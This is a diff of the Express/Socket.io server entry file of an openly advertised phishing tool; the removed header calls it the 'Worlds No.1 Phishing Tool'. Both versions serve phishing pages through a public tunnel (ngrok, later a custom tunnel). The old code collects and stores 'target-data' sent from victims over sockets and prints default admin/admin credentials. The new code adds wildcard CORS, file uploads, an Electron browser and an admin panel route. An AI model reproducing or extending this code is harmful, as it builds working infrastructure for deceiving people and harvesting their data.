@@ -1,85 +1,61 @@
-/**
- * 
- * @Author      : Madhan (Madhanmaaz) - madhan hacker
- * github       : https://github.com/madhanmaaz
- * website      : http://madhanmaaz.netlify.app/
- * Description  : Worlds No.1 Phishing Tool.
- * 
- */
+process.__dirname = __dirname
 
+const { serverInit, getConfig, cout } = require("./utils/server-helpers")
+const expressFileupload = require("express-fileupload")
+const { startTunnel } = require("./utils/tunnel")
+const expressDevice = require("express-device")
+const cookieParser = require("cookie-parser")
+const socketIo = require("socket.io")
+const electron = require("electron")
 const express = require("express")
 const http = require("http")
-const cookieParser = require("cookie-parser")
-const expressDevice = require("express-device")
-const { checkAdminToken, ssd, books, checkId, extractStaticFile } = require("./utils/utils")
-const ngrok = require("ngrok")
+const path = require("path")
 
 const app = express()
 const server = http.createServer(app)
-const io = require("socket.io")(server)
-const config = ssd.getItem("config.json")
+const io = new socketIo.Server(server)
+const PORT = process.env.PORT || getConfig('port')
 
-app.use(express.static(__dirname + "/public"))
+serverInit()
+app.use(express.static(path.join(__dirname, "public")))
 app.use(express.urlencoded({ extended: false }))
+app.set("views", path.join(__dirname, 'views'))
 app.use(expressDevice.capture())
 app.set("view engine", "ejs")
-app.use(express.json())
+app.use(expressFileupload())
 app.use(cookieParser())
-global.io = io
+app.use(express.json())
+global.IO = io
 
+// +======== cors config ==========+
 
-// routes
-app.use("/", require("./route"))
-app.use("/app", require("./route/app"))
-app.use(checkAdminToken)
-app.use("/db", require("./route/db"))
-
-
-// socket connection
-io.on("connection", socket => {
-    socket.on("target-connected", data => {
-        socket.broadcast.emit("in-target-connected", data)
-    })
-
-    socket.on("target-data", data => {
-        const page = checkId(data.id)
-        socket.broadcast.emit("in-target-data", data)
-
-        if (page) {
-            page.data.push(data)
-            books.setItem(`${data.id}.json`, page)
-        }
-    })
+app.use(function (req, res, next) {
+    res.header("Access-Control-Allow-Origin", "*")
+    res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
+    next()
 })
 
+// non admin check
+app.use("/ws-app", require("./router/ws-app"))
 
-const PORT = config.port || process.env.PORT
+
+// admin check
+app.use("/", require("./router"))
+app.use("/panel", require("./router/panel"))
+
+
 server.listen(PORT, async () => {
-    extractStaticFile()
+    await startTunnel()
+    cout.out(`LOCAL SERVER  : http://localhost:${PORT}`)
+    cout.out(`TUNNEL SERVER : ${process.env.WSTUNNELURL}`)
+})
 
-    try {
-        const url = await ngrok.connect({
-            proto: "http",
-            addr: PORT,
-            authtoken: config.ngrokToken
-        })
+electron.app.on("ready", () => {
+    cout.out("Electron browser ready.")
+})
 
-        config["ngrok-url"] = url
-        ssd.setItem("config.json", config)
-    } catch (error) {
-        config["ngrok-url"] = "NGROK-ERROR"
-        ssd.setItem("config.json", config)
-        console.log("NGROK ERROR:", error)
+electron.app.on('window-all-closed', () => {
+    if (process.platform !== 'darwin') {
+        app.quit = false
     }
-
-    require("./utils/banner")
-    console.log(`
-LOCAL URL : http://localhost:${PORT}/ (WEB VIEW)
-PORT      : ${PORT}
-USERNAME  : admin  (default)
-PASSWORD  : admin  (default)
-BROWSER   : chrome (default)
-
-> want to change ./ssd/config.json
-    `)
 })
